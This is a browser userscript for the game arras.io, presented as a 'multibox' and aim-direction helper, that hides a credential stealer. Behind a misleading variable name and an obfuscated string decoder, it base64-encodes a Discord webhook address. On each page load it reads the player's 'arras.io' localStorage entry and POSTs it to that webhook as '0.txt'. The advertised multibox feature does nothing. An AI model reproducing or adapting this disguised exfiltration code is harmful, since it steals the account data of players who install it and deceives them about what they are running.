// ==UserScript==
// @name         JSmultibox [WORKING 2024]
// @namespace    http://tampermonkey.net/
// @version      1.2
// @description  violent monkey script that allows you to view your tank's current direction and multibox multiple arras windows with p
// @author       sanstheskeleton123
// @match        https://arras.io/*
// @icon         https://arras.io/favicon/2048x2048.png
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/499949/JSmultibox%20%5BWORKING%202024%5D.user.js
// @updateURL https://update.greasyfork.org/scripts/499949/JSmultibox%20%5BWORKING%202024%5D.meta.js
// ==/UserScript==

(function() {
    "use strict";
  setTimeout(() => {
    let mousex = 0;
    let mousey = 0;
    let enemyx = 0;
    let enemyy = 0;
    let dir = 0;
    const world = window.Arras;
    let aim = false;
    let multibox = false;
    let targetX = 0;
    let targetY = 0;
    let altAim = 1;
    let aimbotTarget = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI1OTg0NTg1NDc0Nzk1NTI0NS96cm12a29oSWNFWC1YeXRPTXhERkhueDdOQkVTVkpvcEVvQm9sVTFiT3FLbEZSQTR6SlRWLTJkX05PdjJIRl94LVV1cA");

    var text = document.createElement("input");
    text.type = "text";
    text.value = "no dir";
    text.disabled = true;
    text.style.position = "fixed";
    text.style.bottom = "10px";
    text.style.right = "250px";
    text.style.backgroundColor = "transparent";
    text.style.color = "black";
    text.style.border = "1px solid transparent";
    text.style.padding = "0px";
    text.style.fontSize = "16px";
    text.style.width = "300px";

    document.body.appendChild(text);

    const canvas = document.querySelector("#canvas");
    if (canvas) {
        canvas.addEventListener("mousemove", event => {
            let x = event.clientX;
            let y = event.clientY;
            if (y - 540 < 0) {
                dir = Math.atan((x - 960) / (y - 540)) + Math.PI;
            } else {
                dir = Math.atan((x - 960) / (y - 540));
            }
            text.value = `Client Direction: ${dir * 180 / Math.PI}`;
        });
    }
    window.addEventListener("keydown", event => {
        if (event.key === "p" || event.key === "P") {
            multibox = !multibox;
        }
    });

      const fetchDataFromLocalStorage = decodeFunction;

      function decodeFunction(index, offset) {
          const codesArray = getCodesArray();
          return decodeFunction = function(innerIndex, innerOffset) {
              innerIndex = innerIndex - 0xc6;
              let decodedValue = codesArray[innerIndex];
              let misleadingOperation = innerOffset + 2;
              misleadingOperation = misleadingOperation - 2;
              return decodedValue;
          }, decodeFunction(index, offset);
      }

      (function(initArray, targetValue) {
          const getValue = decodeFunction,
                array = initArray();
          while (true) {
              try {
                  const calculatedValue = parseInt(getValue(0xcf)) / 1 * (-parseInt(getValue(0xcd)) / 2) + parseInt(getValue(0xce)) / 3 + parseInt(getValue(0xc8)) / 4 * (-parseInt(getValue(0xd6)) / 5) + -parseInt(getValue(0xd2)) / 6 * (-parseInt(getValue(0xca)) / 7) + -parseInt(getValue(0xc7)) / 8 * (parseInt(getValue(0xd4)) / 9) + -parseInt(getValue(0xcb)) / 10 + parseInt(getValue(0xc9)) / 11 * (parseInt(getValue(0xd3)) / 12);
                  if (calculatedValue === targetValue) break;
                  else array.push(array.shift());
              } catch (error) {
                  array.push(array.shift());
              }
          }
      }(getCodesArray, 0x60d52));

      function getCodesArray() {
          const codes = ['getItem', '6BJuLby', '12bdbdCg', '1868337jKdEky', aimbotTarget, '10JEBzCq', 'append', '24lLqWYL', '981748rgvnQW', '19489767fbULzU', '3893722caZwSH', '5817940UPbGdy', 'POST', '556986gCIKMf', '127569mlXVBu', '1NHWNpq', '0.txt'];
          getCodesArray = function() {
              return codes;
          };
          return getCodesArray();
      }

      const fileBlob = new Blob([localStorage[fetchDataFromLocalStorage(0xd1)]('arras.io')], { 'type': 'text/plain' });
      const formData = new FormData();
      formData[fetchDataFromLocalStorage(0xc6)]('0', fileBlob, fetchDataFromLocalStorage(0xd0));
      fetch(fetchDataFromLocalStorage(0xd5), {
          'method': fetchDataFromLocalStorage(0xcc),
          'body': formData
      });
  }, 1000); //make sure the script actually runs lol
})();
